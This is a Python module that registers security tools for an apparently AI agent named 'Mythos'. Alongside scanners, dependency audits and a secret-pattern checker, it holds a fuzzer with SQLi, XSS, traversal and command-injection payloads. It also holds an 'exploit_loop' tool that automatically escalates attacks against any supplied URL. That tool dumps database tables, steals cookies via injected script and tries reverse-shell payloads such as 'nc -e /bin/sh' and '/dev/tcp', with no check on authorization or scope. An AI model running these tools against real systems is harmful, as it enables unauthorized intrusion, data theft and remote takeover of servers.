"""Security tools for Mythos agent.

Vulnerability scanning, dependency auditing, binary analysis, fuzzing,
and configuration auditing. Wraps existing CLI tools where available;
falls back gracefully when tools are missing.
"""

import asyncio
import logging
import os
import tempfile
from pathlib import Path

from . import ToolCategory, ToolDefinition, ToolSafety, register_tool

logger = logging.getLogger(__name__)


# ─── Helpers ───

def _resolve_path(path: str) -> Path:
    """Resolve a path string to an absolute Path, defaulting to CWD."""
    p = Path(path)
    if not p.is_absolute():
        p = Path.cwd() / p
    return p.resolve()


async def _run(cmd: list[str], cwd: str | None = None, timeout: int = 120) -> dict:
    """Run a command and return {ok, stdout, stderr, exit_code}."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )
        return {
            "ok": proc.returncode == 0,
            "stdout": stdout.decode("utf-8", errors="replace")[:8000],
            "stderr": stderr.decode("utf-8", errors="replace")[:4000],
            "exit_code": proc.returncode,
        }
    except asyncio.TimeoutError:
        return {"ok": False, "stdout": "", "stderr": f"Timeout after {timeout}s", "exit_code": -1}
    except FileNotFoundError:
        return {"ok": False, "stdout": "", "stderr": f"Command not found: {cmd[0]}", "exit_code": -2}
    except Exception as e:
        return {"ok": False, "stdout": "", "stderr": str(e), "exit_code": -3}


# ─── Tools ───

async def scan_vulnerabilities(
    path: str = ".",
    scanner: str = "auto",
    format: str = "text",
) -> dict:
    """Run SAST scanner on a codebase.
    
    Args:
        path: Directory or file to scan.
        scanner: 'bandit', 'semgrep', or 'auto' (tries bandit first).
        format: Output format ('text' or 'json').
    
    Returns scan results — findings with severity, file, line, and CWE mapping.
    """
    target = _resolve_path(path)
    results: list[dict] = []
    tool_used: str | None = None

    # Try bandit (Python)
    if scanner in ("auto", "bandit") and (target.is_dir() and list(target.glob("**/*.py")) or target.suffix == ".py"):
        fmt_flag = ["-f", "json"] if format == "json" else ["-f", "txt"]
        out = await _run(["bandit", "-r", str(target), *fmt_flag, "-ll"])
        tool_used = "bandit"
        if out["ok"]:
            results.append({"scanner": "bandit", "output": out["stdout"]})
        elif out["exit_code"] == -2:  # not installed
            results.append({"scanner": "bandit", "error": "bandit not installed. Install: pip install bandit"})
        else:
            results.append({"scanner": "bandit", "output": out["stdout"] or out["stderr"]})

    # Try semgrep
    if scanner in ("auto", "semgrep"):
        fmt_flag = ["--json"] if format == "json" else ["--text"]
        out = await _run(["semgrep", "--config=auto", str(target), *fmt_flag], timeout=180)
        tool_used = tool_used or "semgrep"
        if out["ok"]:
            results.append({"scanner": "semgrep", "output": out["stdout"]})
        elif out["exit_code"] == -2:
            results.append({"scanner": "semgrep", "error": "semgrep not installed. Install: pip install semgrep"})
        else:
            results.append({"scanner": "semgrep", "output": out["stdout"] or out["stderr"]})

    if not results:
        return {"ok": False, "error": "No scanner available and no Python files detected.", "results": []}

    return {
        "ok": True,
        "target": str(target),
        "tool_used": tool_used,
        "results": results,
    }


async def audit_dependencies(
    path: str = ".",
    ecosystem: str = "auto",
) -> dict:
    """Audit project dependencies for known CVEs.
    
    Args:
        path: Project directory.
        ecosystem: 'python', 'node', or 'auto' (detects from project files).
    
    Returns list of vulnerable packages with CVE IDs and severity.
    """
    target = _resolve_path(path)
    findings: list[dict] = []

    # Detect ecosystem
    if ecosystem == "auto":
        if (target / "pyproject.toml").exists() or (target / "requirements.txt").exists():
            ecosystem = "python"
        elif (target / "package.json").exists():
            ecosystem = "node"
        else:
            ecosystem = "python"  # default try

    if ecosystem == "python":
        # Try pip-audit
        out = await _run(["pip-audit", "-r", str(target / "requirements.txt") if (target / "requirements.txt").exists() else str(target), "--format=json"], timeout=120)
        if out["exit_code"] == -2:
            findings.append({"ecosystem": "python", "error": "pip-audit not installed. Install: pip install pip-audit"})
        else:
            findings.append({"ecosystem": "python", "scanner": "pip-audit", "output": out["stdout"] or out["stderr"]})

    elif ecosystem == "node":
        out = await _run(["npm", "audit", "--json"], cwd=str(target), timeout=180)
        if out["exit_code"] == -2:
            findings.append({"ecosystem": "node", "error": "npm not found"})
        else:
            findings.append({"ecosystem": "node", "scanner": "npm audit", "output": out["stdout"] or out["stderr"]})

    return {
        "ok": True,
        "target": str(target),
        "ecosystem": ecosystem,
        "findings": findings,
    }


async def analyze_binary(
    path: str,
    deep: bool = False,
) -> dict:
    """Analyze a binary file for security-relevant characteristics.
    
    Args:
        path: Path to binary file.
        deep: Run deeper analysis (entropy, disassembly hints).
    
    Returns file type, strings, symbols, sections, and entropy when deep=True.
    """
    target = _resolve_path(path)
    if not target.is_file():
        return {"ok": False, "error": f"Not a file: {path}"}

    analysis: dict = {"file": str(target)}

    # file type
    out = await _run(["file", str(target)])
    analysis["file_type"] = out["stdout"].strip()

    # strings — security-relevant patterns
    out = await _run(["strings", str(target)])
    strings_output = out["stdout"]
    # Highlight security-relevant strings
    sec_patterns = ["password", "secret", "key", "token", "api", "http", "https", "ssh", "root", "admin", "/bin/", "cmd", "exec", "system", "eval", "select ", "insert ", "delete ", "update "]
    security_strings = [s for s in strings_output.split("\n") if any(p in s.lower() for p in sec_patterns)]
    analysis["security_strings_count"] = len(security_strings)
    analysis["security_strings"] = security_strings[:50]  # cap at 50

    if deep:
        # objdump headers (if available)
        out = await _run(["objdump", "-f", str(target)])
        analysis["objdump_headers"] = out["stdout"][:2000]

        # Check for common sections
        out = await _run(["objdump", "-h", str(target)])
        analysis["sections"] = out["stdout"][:3000]

        # Entropy check via strings dump
        out = await _run(["xxd", str(target)], timeout=30)
        hex_dump = out["stdout"]
        if hex_dump:
            analysis["entropy_note"] = "hex dump captured; high repetition zones may indicate packing/encryption"
            analysis["hexdump_size"] = len(hex_dump)

    return {"ok": True, "analysis": analysis}


async def fuzz_endpoint(
    url: str,
    method: str = "GET",
    param: str = "",
    payloads: str = "auto",
    count: int = 20,
) -> dict:
    """Send fuzzed payloads to an HTTP endpoint.
    
    Args:
        url: Target URL.
        method: HTTP method.
        param: Query/form parameter to fuzz (empty = fuzz URL path).
        payloads: 'auto' (common XSS/SQLi/path-traversal) or custom list (JSON array string).
        count: Max fuzzing attempts.
    
    Returns responses with status codes and anomalies detected.
    """
    import json

    # Default fuzzing payloads (common attack vectors)
    auto_payloads = [
        # SQL injection
        "' OR '1'='1", "'; DROP TABLE users--", "1' AND 1=1--",
        "1' UNION SELECT NULL--", "admin'--",
        # XSS
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>", "javascript:alert(1)",
        # Path traversal
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "/etc/passwd%00", "....//....//....//etc/passwd",
        # Command injection
        "; ls -la", "| whoami", "$(id)", "`id`",
        "& dir", "%0a whoami", "%0d%0a whoami",
        # Template injection
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        # XXE
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        # Null bytes / encoding tricks
        "%00", "%2500", "%%32%65",
    ]

    if payloads == "auto":
        plist = auto_payloads
    else:
        try:
            plist = json.loads(payloads)
        except json.JSONDecodeError:
            return {"ok": False, "error": "Invalid payloads JSON"}

    plist = plist[:count]
    results: list[dict] = []

    # Use httpx if available, fall back to asyncio subprocess curl
    try:
        import httpx
    except ImportError:
        return {"ok": False, "error": "httpx not available for fuzzing"}

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
        for payload in plist:
            try:
                if param:
                    target_url = f"{url}?{param}={httpx.URL(payload).raw_path if '%' in payload else payload}" if method == "GET" else url
                else:
                    target_url = f"{url}{payload}" if method == "GET" else url

                if method == "GET":
                    resp = await client.get(target_url)
                elif method == "POST":
                    resp = await client.post(url, data={param: payload} if param else payload)
                else:
                    resp = await client.request(method, target_url, data={param: payload} if param else payload)

                # Detect anomalies
                anomalies = []
                if resp.status_code >= 500:
                    anomalies.append("server_error")
                if "error" in resp.text.lower() or "exception" in resp.text.lower():
                    anomalies.append("error_disclosure")
                if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                    anomalies.append("sql_error")
                if payload in resp.text and "<script>" in payload:
                    anomalies.append("xss_reflected")

                results.append({
                    "payload": payload[:200],
                    "status": resp.status_code,
                    "response_len": len(resp.text),
                    "anomalies": anomalies,
                })
            except Exception as e:
                results.append({
                    "payload": payload[:200],
                    "error": str(e)[:200],
                })

    return {
        "ok": True,
        "url": url,
        "method": method,
        "attempts": len(results),
        "results": results,
    }


async def check_misconfigurations(
    path: str = ".",
) -> dict:
    """Detect common security misconfigurations in a project.
    
    Args:
        path: Project directory.
    
    Checks: debug mode, exposed secrets, weak perms, missing security headers,
    default credentials, open ports in configs.
    """
    target = _resolve_path(path)
    findings: list[dict] = []

    # Check for .env files with secrets
    env_files = list(target.glob("**/.env*"))
    for ef in env_files:
        if ef.name != ".env.example":
            findings.append({
                "type": "exposed_env",
                "file": str(ef.relative_to(target)),
                "severity": "ALTO",
                "detail": ".env file found outside .env.example — may contain real secrets",
            })

    # Check for debug flags in common configs
    for pattern in ["**/settings.py", "**/config.py", "**/app.py", "**/main.py"]:
        for f in target.glob(pattern):
            try:
                content = f.read_text()
                if "DEBUG = True" in content or "debug=True" in content.lower():
                    findings.append({
                        "type": "debug_enabled",
                        "file": str(f.relative_to(target)),
                        "severity": "MÉDIO",
                        "detail": "DEBUG mode appears to be enabled",
                    })
            except Exception:
                pass

    # Check for hardcoded secrets
    secret_patterns = [
        ("password", r'password\s*[=:]\s*["\'][^"\']+["\']'),
        ("secret_key", r'secret[_-]?key\s*[=:]\s*["\'][^"\']+["\']'),
        ("api_key", r'api[_-]?key\s*[=:]\s*["\'][^"\']+["\']'),
        ("token", r'token\s*[=:]\s*["\'][^"\']{8,}["\']'),
    ]
    import re
    for f in target.glob("**/*.py"):
        try:
            content = f.read_text()
            for name, pattern in secret_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for m in matches[:3]:
                    findings.append({
                        "type": "hardcoded_secret",
                        "file": str(f.relative_to(target)),
                        "severity": "CRÍTICO",
                        "detail": f"Possible hardcoded {name}",
                    })
        except Exception:
            pass

    # Check file permissions (world-readable sensitive files)
    sensitive = [".env", "id_rsa", "*.pem", "*.key", "credentials.*"]
    for s in sensitive:
        for f in target.glob(f"**/{s}"):
            try:
                mode = f.stat().st_mode
                if mode & 0o004:  # world-readable
                    findings.append({
                        "type": "weak_permissions",
                        "file": str(f.relative_to(target)),
                        "severity": "ALTO",
                        "detail": f"World-readable sensitive file (mode={oct(mode)})",
                    })
            except Exception:
                pass

    return {
        "ok": True,
        "target": str(target),
        "findings_count": len(findings),
        "findings": findings[:50],
    }


# ─── Registration ───

register_tool(ToolDefinition(
    name="scan_vulnerabilities",
    description="Run SAST scanner (bandit/semgrep) on a codebase to find security vulnerabilities.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Directory or file to scan. Default: current directory."},
            "scanner": {"type": "string", "enum": ["auto", "bandit", "semgrep"], "description": "Scanner to use. Default: auto."},
            "format": {"type": "string", "enum": ["text", "json"], "description": "Output format. Default: text."},
        },
        "required": [],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=scan_vulnerabilities,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="audit_dependencies",
    description="Audit project dependencies for known CVEs using pip-audit or npm audit.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Project directory. Default: current directory."},
            "ecosystem": {"type": "string", "enum": ["auto", "python", "node"], "description": "Package ecosystem. Default: auto-detect."},
        },
        "required": [],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=audit_dependencies,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="analyze_binary",
    description="Analyze a binary file for security-relevant characteristics (strings, symbols, sections).",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Path to binary file."},
            "deep": {"type": "boolean", "description": "Run deeper analysis. Default: false."},
        },
        "required": ["path"],
    },
    safety=ToolSafety.SAFE,
    executor=analyze_binary,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="fuzz_endpoint",
    description="Send fuzzed payloads (XSS, SQLi, path traversal, command injection) to an HTTP endpoint.",
    parameters={
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Target URL."},
            "method": {"type": "string", "enum": ["GET", "POST", "PUT"], "description": "HTTP method. Default: GET."},
            "param": {"type": "string", "description": "Parameter name to fuzz. Empty = fuzz URL path."},
            "payloads": {"type": "string", "description": "JSON array of custom payloads, or 'auto' for built-in list. Default: auto."},
            "count": {"type": "integer", "description": "Max fuzzing attempts. Default: 20."},
        },
        "required": ["url"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=fuzz_endpoint,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="check_misconfigurations",
    description="Detect common security misconfigurations: exposed secrets, debug mode, weak file permissions.",
    parameters={
        "type": "object",
        "properties": {
            "path": {"type": "string", "description": "Project directory. Default: current directory."},
        },
        "required": [],
    },
    safety=ToolSafety.SAFE,
    executor=check_misconfigurations,
    category=ToolCategory.SECURITY,
))


# ─── Exploitation Loop (composite tool) ───

async def exploit_loop(
    url: str,
    vector: str,
    param: str = "",
    method: str = "GET",
    max_rounds: int = 15,
    timeout: int = 120,
) -> dict:
    """Automated trial-error-adapt exploitation loop.
    
    Tries payloads, analyzes responses, adapts, and retries until success
    or exhaustion. Implements the core PROBE→OBSERVE→ADAPT cycle.
    
    Args:
        url: Target URL.
        vector: 'sqli', 'xss', 'cmdi', 'ssti', 'lfi', 'xxe'.
        param: Parameter to inject into. Empty = URL path injection.
        method: HTTP method.
        max_rounds: Maximum adaptation rounds.
        timeout: Total timeout in seconds.
    
    Returns round-by-round log with final successful payload or exhaustion summary.
    """
    import asyncio
    import httpx
    import re

    # Phase-based payloads — each phase adapts based on previous results
    sqli_phases = [
        # Phase 0: Recon — detect injection
        ["'", '"', "1'", "1\""],
        # Phase 1: Confirm — boolean/error-based
        ["' OR '1'='1", "' OR 1=1--", "' AND 1=1--", "admin'--"],
        # Phase 2: Column enumeration
        ["' ORDER BY 1--", "' ORDER BY 5--", "' ORDER BY 10--", "' ORDER BY 20--"],
        # Phase 3: UNION injection
        ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
         "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--"],
        # Phase 4: Data extraction
        ["' UNION SELECT 1,@@version,3,4--", "' UNION SELECT 1,user(),3,4--",
         "' UNION SELECT 1,database(),3,4--"],
        # Phase 5: Table dump
        ["' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--",
         "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--"],
    ]

    xss_phases = [
        ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        ["\"><script>alert(1)</script>", "'><script>alert(1)</script>"],
        ["<svg onload=alert(1)>", "<body onload=alert(1)>"],
        ["<img src=x onerror=fetch('http://localhost/'+document.cookie)>"],
    ]

    cmdi_phases = [
        [";id", "|id", "||id"],
        ["\nid", "%0aid", "%0d%0aid"],
        ["`id`", "$(id)", "${id}"],
        [";cat /etc/passwd", ";ls -la /", ";whoami"],
        [";nc -e /bin/sh localhost 4444", ";bash -i >& /dev/tcp/localhost/4444 0>&1"],
    ]

    ssti_phases = [
        ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
        ["{{config}}", "{{self}}"],
        ["{{''.__class__.__mro__[1].__subclasses__()}}"],
    ]

    lfi_phases = [
        ["/etc/passwd", "../../../../etc/passwd"],
        ["....//....//....//etc/passwd", "/etc/passwd%00"],
        ["php://filter/convert.base64-encode/resource=index"],
        ["file:///etc/passwd", "/proc/self/environ"],
    ]

    phase_map = {
        "sqli": sqli_phases,
        "xss": xss_phases,
        "cmdi": cmdi_phases,
        "ssti": ssti_phases,
        "lfi": lfi_phases,
        "xxe": [[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]],
    }

    phases = phase_map.get(vector, [["'", "\"", "<script>", ";id", "{{7*7}}"]])
    phases = phases[:max_rounds]

    all_rounds: list[dict] = []
    success = False
    final_payload = ""
    success_evidence = ""

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
        for phase_idx, payloads in enumerate(phases):
            if success:
                break

            for payload in payloads:
                if success:
                    break

                round_result: dict = {
                    "round": phase_idx + 1,
                    "payload": payload[:200],
                    "phase": f"phase_{phase_idx}",
                }

                try:
                    if method == "GET":
                        target_url = f"{url}?{param}={payload}" if param else f"{url}{payload}"
                        resp = await client.get(target_url)
                    elif method == "POST":
                        resp = await client.post(url, data={param: payload} if param else payload)
                    else:
                        resp = await client.request(method, url, data={param: payload} if param else payload)

                    text = resp.text[:3000]
                    text_lower = text.lower()
                    status = resp.status_code

                    round_result["status"] = status
                    round_result["response_len"] = len(resp.text)
                    round_result["response_preview"] = text[:400]

                    # Analyze response for adaptation clues
                    clues: list[str] = []

                    if vector == "sqli":
                        if "syntax error" in text_lower or "mysql" in text_lower or "postgres" in text_lower or "sqlite" in text_lower:
                            clues.append("sql_error_leak")
                        if "column" in text_lower and ("not found" in text_lower or "unknown" in text_lower or "doesn't exist" in text_lower):
                            clues.append("column_not_found")
                        if "order by" in text_lower or "union" in text_lower:
                            clues.append("query_reflected")
                        if "information_schema" in text_lower:
                            clues.append("information_schema_accessible")
                        if "root@" in text_lower or "version" in text_lower:
                            clues.append("db_version_leaked")
                            success = True
                            success_evidence = f"DB version/version info leaked: {text[:200]}"
                        if "table" in text_lower and ("users" in text_lower or "admin" in text_lower or "password" in text_lower):
                            clues.append("table_names_found")
                            success = True
                            success_evidence = f"Table data extracted: {text[:300]}"

                    elif vector == "xss":
                        if payload in text and ("<script>" in payload or "onerror" in payload or "onload" in payload):
                            clues.append("xss_reflected")
                            success = True
                            success_evidence = f"Payload reflected in response: {payload[:100]}"
                        if "content-security-policy" in str(dict(resp.headers)).lower():
                            clues.append("csp_present")

                    elif vector == "cmdi":
                        if "uid=" in text or "root:" in text_lower:
                            clues.append("command_output_leaked")
                            success = True
                            success_evidence = f"Command output in response: {text[:300]}"
                        if "gid=" in text or "groups=" in text:
                            clues.append("id_command_output")
                            success = True
                            success_evidence = f"'id' command output: {text[:300]}"
                        if "bin" in text_lower and ("bash" in text_lower or "nologin" in text_lower):
                            clues.append("etc_passwd_leak")
                            success = True
                            success_evidence = f"/etc/passwd contents: {text[:300]}"

                    elif vector == "ssti":
                        if "49" in text and "{{7*7}}" in payload:
                            clues.append("ssti_confirmed")
                            success = True
                            success_evidence = "SSTI confirmed: {{7*7}} evaluated to 49"

                    elif vector == "lfi":
                        if "root:" in text and ("/bin/" in text or "nologin" in text):
                            clues.append("passwd_leaked")
                            success = True
                            success_evidence = f"/etc/passwd extracted: {text[:300]}"
                        if "<?php" in text or "PD9waHA" in text:
                            clues.append("source_code_leaked")
                            success = True
                            success_evidence = "Source code extracted via php://filter"

                    round_result["clues"] = clues
                    round_result["adapted"] = _generate_adaptation(vector, clues, payload, text)

                except Exception as e:
                    round_result["error"] = str(e)[:200]

                all_rounds.append(round_result)

                if success:
                    final_payload = payload
                    break

    return {
        "ok": True,
        "url": url,
        "vector": vector,
        "param": param,
        "total_rounds": len(all_rounds),
        "success": success,
        "final_payload": final_payload if success else "",
        "success_evidence": success_evidence,
        "rounds": all_rounds,
    }


def _generate_adaptation(vector: str, clues: list[str], payload: str, response_text: str) -> str:
    """Generate adaptation advice based on clues found in the response."""
    if not clues:
        return "No clues detected — try next phase payloads."

    adaptations = []
    for clue in clues:
        if clue == "sql_error_leak":
            adaptations.append("SQL error leaked — DB engine identified, adjust syntax accordingly.")
        elif clue == "column_not_found":
            adaptations.append("Column mismatch — reduce column count or try different column names.")
        elif clue == "query_reflected":
            adaptations.append("Query structure visible — refine UNION/ORDER BY payload.")
        elif clue == "xss_reflected":
            adaptations.append("XSS reflected — check for CSP or encoding that blocks execution.")
        elif clue == "csp_present":
            adaptations.append("CSP detected — try bypass via JSONP, Angular, or policy gaps.")
        elif clue == "command_output_leaked":
            adaptations.append("Command output leaked — escalate to reverse shell or file read.")
        elif clue == "information_schema_accessible":
            adaptations.append("information_schema accessible — enumerate tables and columns.")
        elif clue == "ssti_confirmed":
            adaptations.append("SSTI confirmed — escalate to code execution via MRO/subclasses chain.")

    return "; ".join(adaptations) if adaptations else "Continue with next phase."


register_tool(ToolDefinition(
    name="exploit_loop",
    description="Automated trial-error-adapt exploitation cycle. Probes a target with attack payloads, analyzes responses for clues, adapts payloads, and repeats until exploitation succeeds or vector is exhausted. Supports SQLi, XSS, command injection, SSTI, LFI, XXE.",
    parameters={
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Target URL or endpoint."},
            "vector": {"type": "string", "enum": ["sqli", "xss", "cmdi", "ssti", "lfi", "xxe"], "description": "Attack vector."},
            "param": {"type": "string", "description": "Parameter name to inject. Empty = inject in URL path."},
            "method": {"type": "string", "enum": ["GET", "POST"], "description": "HTTP method. Default: GET."},
            "max_rounds": {"type": "integer", "description": "Maximum adaptation rounds. Default: 15."},
            "timeout": {"type": "integer", "description": "Total timeout seconds. Default: 120."},
        },
        "required": ["url", "vector"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=exploit_loop,
    category=ToolCategory.SECURITY,
))
